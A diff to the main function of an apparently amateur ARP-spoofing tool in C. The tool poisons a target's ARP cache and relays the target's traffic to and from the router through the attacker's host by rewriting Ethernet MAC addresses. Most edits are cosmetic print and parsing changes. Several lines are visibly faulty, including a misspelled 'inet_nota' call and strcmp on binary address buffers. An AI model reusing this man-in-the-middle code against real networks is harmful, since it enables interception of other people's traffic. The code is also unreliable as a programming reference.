@@ -17,20 +17,20 @@
 
 int main(int argc, char *argv[])
 {
-  u_int8_t my_ip[IP_ADDR_SIZE];        // my ip
+  u_int8_t my_ip[IP_ADDR_SIZE];          // my ip
   u_int8_t my_mac[MAC_ADDR_SIZE];        // my mac
-  u_int8_t router_ip[IP_ADDR_SIZE];     // router ip
-  u_int8_t router_mac[MAC_ADDR_SIZE];     // router ip
-  u_int8_t *ifname;          // interface name
-  u_int8_t *targetIP;    // target ip
-  u_int8_t targetMAC[MAC_ADDR_SIZE];    // target mac
+  u_int8_t router_ip[IP_ADDR_SIZE];      // router ip
+  u_int8_t router_mac[MAC_ADDR_SIZE];    // router ip
+  u_int8_t *ifname;                      // interface name
+  u_int8_t *targetIP;                    // target ip
+  u_int8_t targetMAC[MAC_ADDR_SIZE];     // target mac
   
-  u_int8_t my_ip_hex[4];        // my ip
-  u_int8_t my_mac_hex[6];        // my mac
-  u_int8_t router_ip_hex[4];     // router ip
+  u_int8_t my_ip_hex[4];        
+  u_int8_t my_mac_hex[6];        
+  u_int8_t router_ip_hex[4];     
   u_int8_t router_mac_hex[6]; 
-  u_int8_t targetIP_hex[4];    // target ip
-  u_int8_t targetMAC_hex[6];    // target mac
+  u_int8_t targetIP_hex[4];    
+  u_int8_t targetMAC_hex[6];    
 
   pcap_t *handle;
   struct pcap_pkthdr* header_ptr;
@@ -52,21 +52,18 @@ int main(int argc, char *argv[])
   ifname    = argv[1];
   targetIP  = argv[2];
 
-  printf("\nInput Value ---------------------------------- \n \
-    - Interface \t: %s \n \
-    - Target IP \t: %s \n \
-    ----------------------------------------- \n"   
-    ,ifname,targetIP);
+  printf("\nInput Value -------------------------------------\n ");
+  printf("[*] - Interface \t: %s \n",ifname);
+  printf("[*] - Target IP \t: %s \n",targetIP);
+  printf("-------------------------------------------------\n");     
 
   getLocalAddress(ifname, my_ip, my_mac, router_ip);
-
                                   
-  printf("\nGet Local Information ------------------------ \n \
-    - IP ADDR    \t: %s \n \
-    - MAC ADDR   \t: %s \n \
-    - ROUTER ADDR\t: %s \n \
-    ----------------------------------------- \n"                                            
-    ,my_ip,my_mac,router_ip);
+  printf("\nGet Local Information ---------------------------\n ");
+  printf("[*] - IP ADDR    \t: %s \n ",my_ip);
+  printf("[*] - MAC ADDR   \t: %s \n ",my_mac);
+  printf("[*] - ROUTER ADDR\t: %s \n ",router_ip);
+  printf("------------------------------------------------\n");                                            
 
   arp_request(ifname, my_ip, my_mac, targetIP, targetMAC);   
   arp_spoof(ifname, my_ip, my_mac, router_ip, targetIP, targetMAC); 
@@ -84,15 +81,8 @@ int main(int argc, char *argv[])
         (u_int8_t *)&my_mac_hex[2],
         (u_int8_t *)&my_mac_hex[3],
         (u_int8_t *)&my_mac_hex[4],
-        (u_int8_t *)&my_mac_hex[5]);
-
-    sscanf(router_mac, "%x:%x:%x:%x:%x:%x",  
-        (u_int8_t *)&router_mac_hex[0],
-        (u_int8_t *)&router_mac_hex[1],
-        (u_int8_t *)&router_mac_hex[2],
-        (u_int8_t *)&router_mac_hex[3],
-        (u_int8_t *)&router_mac_hex[4],
-        (u_int8_t *)&router_mac_hex[5]);
+        (u_int8_t *)&my_mac_hex[5]); 
+ 
 
      sscanf(targetMAC, "%x:%x:%x:%x:%x:%x",  
         (u_int8_t *)&targetMAC_hex[0],
@@ -101,6 +91,21 @@ int main(int argc, char *argv[])
         (u_int8_t *)&targetMAC_hex[3],
         (u_int8_t *)&targetMAC_hex[4],
         (u_int8_t *)&targetMAC_hex[5]);
+
+      sscanf(router_mac, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",  
+      (u_int8_t *)&router_mac_hex[0],
+      (u_int8_t *)&router_mac_hex[1],
+      (u_int8_t *)&router_mac_hex[2],
+      (u_int8_t *)&router_mac_hex[3],
+      (u_int8_t *)&router_mac_hex[4],
+      (u_int8_t *)&router_mac_hex[5]);
+
+/*
+      printf("Router: %s :",router_mac);
+      printf(" |router Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X \n",
+          router_mac_hex[0] , router_mac_hex[1] ,
+          router_mac_hex[2] , router_mac_hex[3] ,
+          router_mac_hex[4] , router_mac_hex[5] );*/
 
 
   handle = pcap_open_live(ifname, 65536, 0, 1000, errbuf);
@@ -131,8 +136,11 @@ int main(int argc, char *argv[])
       {
         printf("ARP REQUEST PACKET \n");
 
-        printf("%s== %s \n",arp->arp_tpa,router_ip_hex);
-        printf("%s== %s \n",arp->arp_tpa,router_ip_hex);
+          printf(" |arp target ip Address : %s \n",
+          inet_ntoa(arp->arp_tpa) );
+        
+        printf(" |router Address : %s \n",
+          inet_nota(router_ip_hex));
  
         if(strcmp(arp->arp_tpa, router_ip_hex) == 0)
         {
@@ -173,13 +181,13 @@ int main(int argc, char *argv[])
 
       if(strcmp(dip,targetIP) == 0 )
       {        
-        printf("router -> attacker tcp packet\n");
+        //printf("router -> attacker tcp packet\n");
         memcpy(eth->ether_shost, my_mac_hex,sizeof(my_mac_hex));
         memcpy(eth->ether_dhost, targetMAC_hex,sizeof(targetMAC_hex));      
       }
       else if(strcmp(sip,targetIP) == 0 )
       {         
-        printf("target -> attacker tcp packet\n");
+        //printf("target -> attacker tcp packet\n");
         memcpy(eth->ether_dhost, router_mac_hex,sizeof(router_mac_hex));
         memcpy(eth->ether_shost, my_mac_hex,sizeof(my_mac_hex));        
       }
@@ -193,6 +201,7 @@ int main(int argc, char *argv[])
       } 
       else 
       {
+        continue;
        //printf("Relay\n");
       }
     } 
